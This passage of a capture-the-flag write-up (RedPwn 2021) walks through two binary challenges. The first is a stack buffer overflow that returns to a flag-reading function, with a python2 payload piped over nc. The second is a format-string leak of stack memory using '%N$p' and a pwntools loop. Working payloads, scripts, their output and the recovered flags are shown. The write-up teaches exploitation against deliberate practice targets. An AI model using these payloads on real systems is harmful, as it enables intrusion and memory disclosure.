+   0x0000000000401429 &lt;+132&gt;:   mov    eax,0x0
+   0x000000000040142e &lt;+137&gt;:   leave
+   0x000000000040142f &lt;+138&gt;:   ret
+</div></code></code></pre>
+<p>Nothing unusual, we spot the <code>puts()</code> and the <code>gets()</code> and then the program exits. We disassemble the other function too,</p>
+<pre><code class="language-asm"><code><div>Dump of assembler code for function super_generic_flag_reading_function_please_ret_to_me:
+   0x00000000004011f6 &lt;+0&gt;:     endbr64
+   0x00000000004011fa &lt;+4&gt;:     push   rbp
+   0x00000000004011fb &lt;+5&gt;:     mov    rbp,rsp
+   0x00000000004011fe &lt;+8&gt;:     sub    rsp,0x110
+   0x0000000000401205 &lt;+15&gt;:    mov    QWORD PTR [rbp-0x110],0x0
+   0x0000000000401210 &lt;+26&gt;:    mov    QWORD PTR [rbp-0x108],0x0
+   0x000000000040121b &lt;+37&gt;:    mov    QWORD PTR [rbp-0x100],0x0
+   ...
+
+   0x0000000000401333 &lt;+317&gt;:   mov    QWORD PTR [rbp-0x18],0x0
+   0x000000000040133b &lt;+325&gt;:   lea    rsi,[rip+0xcc6]        # 0x402008
+   0x0000000000401342 &lt;+332&gt;:   lea    rdi,[rip+0xcc1]        # 0x40200a
+   0x0000000000401349 &lt;+339&gt;:   call   0x4010f0 &lt;fopen@plt&gt;
+   0x000000000040134e &lt;+344&gt;:   mov    QWORD PTR [rbp-0x8],rax
+   0x0000000000401352 &lt;+348&gt;:   cmp    QWORD PTR [rbp-0x8],0x0
+   0x0000000000401357 &lt;+353&gt;:   jne    0x40136f &lt;super_generic_flag_reading_function_please_ret_to_me+377&gt;
+   0x0000000000401359 &lt;+355&gt;:   lea    rdi,[rip+0xcb8]        # 0x402018
+   0x0000000000401360 &lt;+362&gt;:   call   0x4010a0 &lt;puts@plt&gt;
+   0x0000000000401365 &lt;+367&gt;:   mov    edi,0xffffffff
+   0x000000000040136a &lt;+372&gt;:   call   0x401100 &lt;exit@plt&gt;
+   0x000000000040136f &lt;+377&gt;:   mov    rdx,QWORD PTR [rbp-0x8]
+   0x0000000000401373 &lt;+381&gt;:   lea    rax,[rbp-0x110]
+   0x000000000040137a &lt;+388&gt;:   mov    esi,0xff
+   0x000000000040137f &lt;+393&gt;:   mov    rdi,rax
+   0x0000000000401382 &lt;+396&gt;:   call   0x4010d0 &lt;fgets@plt&gt;
+   0x0000000000401387 &lt;+401&gt;:   lea    rax,[rbp-0x110]
+   0x000000000040138e &lt;+408&gt;:   mov    rdi,rax
+   0x0000000000401391 &lt;+411&gt;:   call   0x4010a0 &lt;puts@plt&gt;
+   0x0000000000401396 &lt;+416&gt;:   mov    rax,QWORD PTR [rbp-0x8]
+   0x000000000040139a &lt;+420&gt;:   mov    rdi,rax
+   0x000000000040139d &lt;+423&gt;:   call   0x4010b0 &lt;fclose@plt&gt;
+   0x00000000004013a2 &lt;+428&gt;:   nop
+   0x00000000004013a3 &lt;+429&gt;:   leave
+   0x00000000004013a4 &lt;+430&gt;:   ret
+End of assembler dump.
+</div></code></code></pre>
+<p>...Looks like the function starts at address <code>0x00000000004011f6</code>. So we need to return to <code>0x00000000004011f6</code> from <code>main()</code> somehow.</p>
+<ol start="7">
+<li>We run the program normally and use python to print out a bunch of <code>A</code> until we get a segfault. In this case, 40 A's gave us a segmentation fault. We use <code>dmesg | tail</code> to figure out what's going on.</li>
+</ol>
+<pre><code><code><div>❯ python2 -c &quot;print('A'*40)&quot; | ./ret2generic-flag-reader
+alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
+how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
+slap on some flavortext and there's no way rob will fire me now!
+this is genius!! what do you think?
+alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
+how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
+slap on some flavortext and there's no way rob will fire me now!
+this is genius!! what do you think?
+[1]    19478 done                python2 -c &quot;print('A'*40)&quot; |
+       19479 segmentation fault  ./ret2generic-flag-reader
+ ~/CTF/RedPwn2021/writeup_RedPwn2021/pwn/SOLVED_ret2generic-flag-reader │ pwn ?1 ▓▒░────────░▒▓ 0|SEGV х │ 12:16:17 PM
+❯ dmesg | tail
+[328909.667233] ret2generic-fla[19857]: segfault at 7f848d7b14d0 ip 00007f848d7b14d0 sp 00007ffe88da9538 error 15
+[328909.667236] Code: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 &lt;00&gt; 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+</div></code></code></pre>
+<p>So we have a segfault at 7f848d7b14d0. Let's write 41 As and see what happens to that address.</p>
+<pre><code><code><div>[328992.779647] ret2generic-fla[19868]: segfault at 7fbe2f150041 ip 00007fbe2f150041 sp 00007fff48f61740 error 15 in libc-2.31.so[7fbe2f131000+25000]
+</div></code></code></pre>
+<p>Looks like our A's are overflowing the address where segfault is occuring, that is, where the program is trying to return too.</p>
+<ol start="8">
+<li>
+<p>So all we have to do, is replace <code>7fbe2f150041</code> in the dmesg with the address pointer of our flag printer function, and instead of a Segfault the <code>main()</code> will actually return there, because unlike <code>7fbe2f150041</code>, that address, specifically <code>0x00000000004011f6</code> (found from the disassembly) actually exists.</p>
+</li>
+<li>
+<p>So we have to write 40A's or NoOps and then fill the next 6 bytes with <code>0000004011f6</code></p>
+</li>
+</ol>
+<pre><code class="language-py"><div>python2 -c <span class="hljs-string">&quot;print(&#x27;A&#x27;*40 + &#x27;\xf6\x11\x40\x00\x00\x00&#x27;)&quot;</span>
+</div></code></pre>
+<p>Due to endianness, we have to write the bytes upside down. Again I chose to go with python2 because of easier output as bytes. Pipe the output to our local binary,</p>
+<pre><code><code><div>❯ python2 -c &quot;print('A'*40 + '\xf6\x11\x40\x00\x00\x00')&quot; | ./ret2generic-flag-reader
+alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
+how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
+slap on some flavortext and there's no way rob will fire me now!
+this is genius!! what do you think?
+ZZZZZZZZZZZZZZZZZZ
+
+[1]    19503 done                python2 -c &quot;print('A'*40 + '\xf6\x11\x40\x00\x00\x00')&quot; |
+       19504 segmentation fault  ./ret2generic-flag-reader
+</div></code></code></pre>
+<p>...and boom we have our Z's. Now we pipe the output to the server,</p>
+<pre><code><code><div>❯ python2 -c &quot;print('A'*40 + '\xf6\x11\x40\x00\x00\x00')&quot; | nc mc.ax 31077
+alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
+how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
+slap on some flavortext and there's no way rob will fire me now!
+this is genius!! what do you think?
+flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}
+</div></code></code></pre>
+<p>and we have our flag.</p>
+<h5 id="flag-flagrob-loved-the-challenge-but-im-still-paid-minimum-wage">Flag: flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}</h5>
+<h3 id="pwnprintf-please">pwn/printf-please</h3>
+<hr>
+<h4 id="categeory-binary-exploit-1">Categeory: Binary Exploit</h4>
+<h4 id="difficulty-medium-1">Difficulty: Medium</h4>
+<h4 id="keywords-binary-exploit-format-string-exploit-printf">Keywords: Binary Exploit, Format String Exploit, printf</h4>
+<h4 id="author-therealdarkcoder-5">Author: TheRealDarkCoder</h4>
+<h4 id="prompt-5">Prompt:&gt;</h4>
+<pre><code><code><div>Be sure to say please...
+
+nc mc.ax 31569
+
+</div></code></code></pre>
+<h4 id="overview-5">Overview:&gt;</h4>
+<ol>
+<li>We have a port to connect to, a ELF executable and a source code. Running the binary/connecting to the port prompts the following behaviour</li>
+</ol>
+<pre><code class="language-sh"><div>❯ ./please
+what <span class="hljs-keyword">do</span> you say?
+AABBCCDD
+ ~/CTF/RedPwn2021/writeup_RedPwn2021/pwn/SOLVED_printf-please │ pwn ?1 4s │ 12:29:09 PM
+❯ ./please
+what <span class="hljs-keyword">do</span> you say?
+please
+please to you too!
+ ~/CTF/RedPwn2021/writeup_RedPwn2021/pwn/SOLVED_printf-please │ pwn ?1 12:29:12 PM
+❯ ./please
+what <span class="hljs-keyword">do</span> you say?
+please AABBCCDD
+please AABBCCDD to you too!
+</div></code></pre>
+<p>So if we give any input after the keyword <code>please</code>, the program reflects it back to us.</p>
+<ol start="2">
+<li>We take a look at the source code, only one <code>main()</code> function,</li>
+</ol>
+<pre><code class="language-c"><div><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span>
+</span>{
+  <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">0x200</span>];
+  <span class="hljs-keyword">char</span> flag[<span class="hljs-number">0x200</span>];
+
+  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);
+  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);
+  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);
+
+  <span class="hljs-built_in">memset</span>(buffer, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buffer));
+  <span class="hljs-built_in">memset</span>(flag, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(flag));
+
+  <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;flag.txt&quot;</span>, O_RDONLY);
+  <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) {
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;failed to read flag. please contact an admin if this is remote&quot;</span>);
+    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+  }
+
+  read(fd, flag, <span class="hljs-keyword">sizeof</span>(flag));
+  close(fd);
+
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;what do you say?&quot;</span>);
+
+  read(<span class="hljs-number">0</span>, buffer, <span class="hljs-keyword">sizeof</span>(buffer) - <span class="hljs-number">1</span>);
+  buffer[<span class="hljs-built_in">strcspn</span>(buffer, <span class="hljs-string">&quot;\n&quot;</span>)] = <span class="hljs-number">0</span>;
+
+  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(buffer, <span class="hljs-string">&quot;please&quot;</span>, <span class="hljs-number">6</span>)) {
+    <span class="hljs-built_in">printf</span>(buffer);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; to you too!&quot;</span>);
+  }
+}
+</div></code></pre>
+<p>So the prgram sets a 512 bytes allocation for the buffer and 512 bytes for the flag (0x200 = 512). It then sets the buffer and flag with 0s. The program then opens a <code>flag.txt</code> and reads the file and puts the <code>flag</code> part of the memory.</p>
+<p>The program then asks for useinput, this time using <code>strcspn()</code>, safer then <code>gets()</code> of course. So probably not a buffer overflow. But, if the userinput contains <code>please</code>, it <code>printf()</code>s the entire buffer, and there's the attack vector</p>
+<pre><code class="language-c"><div><span class="hljs-built_in">printf</span>(buffer);
+</div></code></pre>
+<p>No format mentioned. So the program should be vulnerable to format string exploits. Let's try some common attacks.</p>
+<pre><code><code><div>❯ ./please
+what do you say?
+please %d
+please 177207190 to you too!
+ ~/CTF/RedPwn2021/writeup_RedPwn2021/pwn/SOLVED_printf-please │ pwn ?1 12:34:05 PM
+❯ ./please
+what do you say?
+please %p
+please 0x7ffe1cfe98d6 to you too!
+</div></code></code></pre>
+<p>We have memory leaks.</p>
+<ol start="3">
+<li>We make a fake <code>flag.txt</code> file and fill it with <code>AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPP</code>s to simulate the server. Then we write a python script which iterates through some numbers and try to print the i'th pointer in memory using this vulnerability. It is to be noted, we can take the xth address from memory using the format <code>please %x$p</code>. So if we want the 70th address we can input <code>please %70$p</code>\</li>
+</ol>
+<pre><code><code><div>❯ ./please
+what do you say?
+please %70$p
+please 0x5a5a5a5a5a5a5a5a to you too!
+</div></code></code></pre>
+<p>We use pwntools in the python script</p>
+<pre><code class="language-python"><div><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+context.log_level = <span class="hljs-string">&#x27;critical&#x27;</span>
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):
+
+
+    <span class="hljs-comment">#s = remote(&#x27;mc.ax&#x27;, 31569)</span>
+    s = process(<span class="hljs-string">&#x27;./please&#x27;</span>)
+
+    s.recvline()
+    s.sendline(<span class="hljs-string">&#x27;please %&#x27;</span> + str(i) + <span class="hljs-string">&#x27;$p&#x27;</span>)
+
+    <span class="hljs-keyword">try</span>:
+        output = str(s.recv())
+        print(str(i) + <span class="hljs-string">&quot; &gt; &quot;</span> + output)
+    <span class="hljs-keyword">except</span>:
+      <span class="hljs-comment">#s.close()</span>
+      s.shutdown()
+
+    <span class="hljs-comment">#s.close()</span>
+    s.shutdown()
+</div></code></pre>
+<p>We get this output</p>
+<details>
+<summary>Output</summary>
+<pre><code><code><div>❯ python3 ape.py
+ape.py:37: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  s.sendline('please %' + str(i) + '$p')
+0 &gt; b'please %0$p to you too!\n'
+1 &gt; b'please 0x7ffc98f47bf6 to you too!\n'
+2 &gt; b'please 0x1 to you too!\n'
+3 &gt; b'please (nil) to you too!\n'
+4 &gt; b'please 0x56304acf5010 to you too!\n'
+5 &gt; b'please 0x7f2c90bafd50 to you too!\n'
+6 &gt; b'please 0x2520657361656c70 to you too!\n'
+7 &gt; b'please 0x702437 to you too!\n'
+8 &gt; b'please (nil) to you too!\n'
+9 &gt; b'please (nil) to you too!\n'
+10 &gt; b'please (nil) to you too!\n'
+11 &gt; b'please (nil) to you too!\n'
+12 &gt; b'please (nil) to you too!\n'
+13 &gt; b'please (nil) to you too!\n'
+14 &gt; b'please (nil) to you too!\n'
+15 &gt; b'please (nil) to you too!\n'
+16 &gt; b'please (nil) to you too!\n'
+17 &gt; b'please (nil) to you too!\n'
+18 &gt; b'please (nil) to you too!\n'
+19 &gt; b'please (nil) to you too!\n'
+20 &gt; b'please (nil) to you too!\n'
+21 &gt; b'please (nil) to you too!\n'
+22 &gt; b'please (nil) to you too!\n'
+23 &gt; b'please (nil) to you too!\n'
+24 &gt; b'please (nil) to you too!\n'
+25 &gt; b'please (nil) to you too!\n'
+26 &gt; b'please (nil) to you too!\n'
+27 &gt; b'please (nil) to you too!\n'
+28 &gt; b'please (nil) to you too!\n'
+29 &gt; b'please (nil) to you too!\n'
+30 &gt; b'please (nil) to you too!\n'
+31 &gt; b'please (nil) to you too!\n'
+32 &gt; b'please (nil) to you too!\n'
+33 &gt; b'please (nil) to you too!\n'
+34 &gt; b'please (nil) to you too!\n'
+35 &gt; b'please (nil) to you too!\n'
+36 &gt; b'please (nil) to you too!\n'
+37 &gt; b'please (nil) to you too!\n'
+38 &gt; b'please (nil) to you too!\n'
+39 &gt; b'please (nil) to you too!\n'
+40 &gt; b'please (nil) to you too!\n'
+41 &gt; b'please (nil) to you too!\n'
+42 &gt; b'please (nil) to you too!\n'
+43 &gt; b'please (nil) to you too!\n'
+44 &gt; b'please (nil) to you too!\n'
+45 &gt; b'please (nil) to you too!\n'
+46 &gt; b'please (nil) to you too!\n'
+47 &gt; b'please (nil) to you too!\n'
+48 &gt; b'please (nil) to you too!\n'
+49 &gt; b'please (nil) to you too!\n'
+50 &gt; b'please (nil) to you too!\n'
+51 &gt; b'please (nil) to you too!\n'
+52 &gt; b'please (nil) to you too!\n'
+53 &gt; b'please (nil) to you too!\n'
+54 &gt; b'please (nil) to you too!\n'
+55 &gt; b'please (nil) to you too!\n'
+56 &gt; b'please (nil) to you too!\n'
+57 &gt; b'please (nil) to you too!\n'
+58 &gt; b'please (nil) to you too!\n'
+59 &gt; b'please (nil) to you too!\n'
+60 &gt; b'please (nil) to you too!\n'
+61 &gt; b'please (nil) to you too!\n'
+62 &gt; b'please (nil) to you too!\n'
+63 &gt; b'please (nil) to you too!\n'
+64 &gt; b'please (nil) to you too!\n'
+65 &gt; b'please (nil) to you too!\n'
+66 &gt; b'please (nil) to you too!\n'
+67 &gt; b'please (nil) to you too!\n'
+68 &gt; b'please (nil) to you too!\n'
+69 &gt; b'please (nil) to you too!\n'
+70 &gt; b'please 0x4444434342424141 to you too!\n'
+71 &gt; b'please 0x4848474746464545 to you too!\n'
+72 &gt; b'please 0x4c4c4b4b4a4a4949 to you too!\n'
+73 &gt; b'please 0x50504f4f4e4e4d4d to you too!\n'
+74 &gt; b'please (nil) to you too!\n'
+75 &gt; b'please (nil) to you too!\n'
+76 &gt; b'please (nil) to you too!\n'
+77 &gt; b'please (nil) to you too!\n'
+78 &gt; b'please (nil) to you too!\n'
+79 &gt; b'please (nil) to you too!\n'
+80 &gt; b'please (nil) to you too!\n'
+81 &gt; b'please (nil) to you too!\n'
+82 &gt; b'please (nil) to you too!\n'
+83 &gt; b'please (nil) to you too!\n'
+84 &gt; b'please (nil) to you too!\n'
+85 &gt; b'please (nil) to you too!\n'
+86 &gt; b'please (nil) to you too!\n'
+87 &gt; b'please (nil) to you too!\n'
+88 &gt; b'please (nil) to you too!\n'
+89 &gt; b'please (nil) to you too!\n'
+90 &gt; b'please (nil) to you too!\n'
+91 &gt; b'please (nil) to you too!\n'
+92 &gt; b'please (nil) to you too!\n'
+93 &gt; b'please (nil) to you too!\n'
+94 &gt; b'please (nil) to you too!\n'
+95 &gt; b'please (nil) to you too!\n'
+96 &gt; b'please (nil) to you too!\n'
+97 &gt; b'please (nil) to you too!\n'
+98 &gt; b'please (nil) to you too!\n'
+99 &gt; b'please (nil) to you too!\n'
+
+</div></code></code></pre>
+</details>
+<p>If you observe carefully, you'll see that for i = 70 through 74, we get 0x4444434342424141, which is the hex of ASCII AABBCCDD, part of our flag. So we're pretty sure that's where our flag is. Let's write a python script to get those parts and attach them together. We also note that the bytes are reversed, probably endianness issue.</p>
+<ol start="4">
+<li>
+<p>We modify the python script. The idea is</p>
+<ol>
+<li>We iterate 5 times to get the bytes for 70 to 75th pointers of the memory in the remote server.</li>
+<li>We take the output. It's formatted as <code>b'please 0x4444434342424141 to you too!\n'</code>. So we remove the first 9 characters, and last 15 characters to isolate the value we need.</li>
+<li>We remove the 0x and append them into a long string of all characters.</li>
+<li>We iterate through the string, taking 2 characters each time to represent a byte and put them in <code>flag_bytes</code></li>
+</ol>
+<pre><code><code><div>flag_bytes = [&quot;44&quot;, &quot;&quot;44&quot;, &quot;43&quot;, &quot;43&quot;, ...]
+</div></code></code></pre>
+<ol start="5">
+<li>Once we write 8 bytes, we convert it into one word and put them in flag_word. This is done because we get 8 bytes from each server connection and this helps to isolate each returns and reverse them later.</li>
+</ol>
+<pre><code><code><div>flag_words = [['44', '44', '43', '43', '42', '42', '41', '41'], ['48', '48', '47', '47', '46', '46', '45', '45'], ['4c', '4c', '4b', '4b', '4a', '4a', '49', '49'], ['50', '50', '4f', '4f', '4e', '4e', '4d', '4d']]
+</div></code></code></pre>
+<ol start="6">
+<li>We take each word, reverse them, convert each byte into printable ASCII, put them in a list and join them to get the flag,</li>
+</ol>
+</li>
+</ol>
+<pre><code><code><div>flag{pl3as3_pr1ntf_w1th_caut10n_
+</div></code></code></pre>
+<p>is what we get from the program. We don't get the last word because it's short of 3 bits. So we modify the python script to add 3 0's before the last output (before because once it's reversed it'll go to the end.)</p>
+<ol start="7">
+<li>Run the script and we have a flag.</li>
+</ol>
+<pre><code><code><div>❯ python3 ape.py
+ape.py:19: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  s.sendline('please %' + str(i) + '$p')
+336c707b67616c66
+6e3172705f337361
+5f687431775f6674
+5f6e303174756163
+a7d6c78336139
+flag{pl3as3_pr1ntf_w1th_caut10n_9a3xl}
+\x00
+</div></code></code></pre>
+<p>Refer to the python script for more clearance, it's not the most efficient solution but enough to explain the workflow.</p>
+<h5 id="flag-flagpl3as3_pr1ntf_w1th_caut10n_9a3xl">Flag: flag{pl3as3_pr1ntf_w1th_caut10n_9a3xl}</h5>
 
     </body>
     </html>
